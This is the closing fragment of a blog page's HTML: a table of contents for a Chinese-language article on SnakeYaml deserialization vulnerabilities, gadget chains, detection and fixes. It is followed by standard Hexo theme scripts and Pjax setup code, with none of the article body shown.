href="#public-%E7%9A%84-getter-%E6%96%B9%E6%B3%95%E4%B8%8D%E8%83%BD%E8%A2%AB%E8%B0%83%E7%94%A8%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">public 的 getter 方法不能被调用的原因</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SnakeYaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B-SPI-%E9%93%BE%E5%AD%90"><span class="nav-text">0x03 SnakeYaml 反序列化漏洞之 SPI 链子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-SPI-%E6%9C%BA%E5%88%B6-%E5%9F%BA%E4%BA%8E-ScriptEngineManager-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">利用 SPI 机制 - 基于 ScriptEngineManager 利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-%E4%B8%8E%E6%94%BB%E5%87%BB"><span class="nav-text">EXP 与攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SPI-%E6%9C%BA%E5%88%B6"><span class="nav-text">SPI 机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-SnakeYaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84-Gadgets"><span class="nav-text">0x04 SnakeYaml 反序列化漏洞的 Gadgets</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E8%AF%B4-gadgets-%E4%B9%8B%E5%89%8D%E6%9C%89%E4%B8%80%E4%BA%9B%E5%BE%88%E6%9C%89%E5%BF%85%E8%A6%81%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">在说 gadgets 之前有一些很有必要的基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-PropertyPathFactoryBean"><span class="nav-text">Spring PropertyPathFactoryBean</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-XBean"><span class="nav-text">Apache XBean</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%93%BE%E5%B0%BE"><span class="nav-text">链尾</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E6%9E%84%E9%80%A0%EF%BC%88%E9%87%8D%E8%A6%81%EF%BC%89"><span class="nav-text">EXP 的分析与构造（重要）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C3P0-JndiRefForwardingDataSource"><span class="nav-text">C3P0 JndiRefForwardingDataSource</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C3P0-WrapperConnectionPoolDataSource"><span class="nav-text">C3P0 WrapperConnectionPoolDataSource</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Commons-Configuration"><span class="nav-text">Apache Commons Configuration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-SnakeYaml-%E7%9A%84%E6%8E%A2%E6%B5%8B"><span class="nav-text">0x05 SnakeYaml 的探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SPI-%E7%9A%84%E6%8E%A2%E6%B5%8B%E9%93%BE%E5%AD%90"><span class="nav-text">SPI 的探测链子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Key-%E8%B0%83%E7%94%A8-hashCode-%E6%96%B9%E6%B3%95%E6%8E%A2%E6%B5%8B"><span class="nav-text">使用 Key 调用 hashCode 方法探测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E9%83%A8%E7%B1%BB"><span class="nav-text">探测内部类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-SnakeYaml-%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="nav-text">0x06 SnakeYaml 漏洞的修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x07 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">0x08 参考资料</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/code-block.js"></script>




<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/toc.js"></script>
        
    
    
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>




</body>
</html>
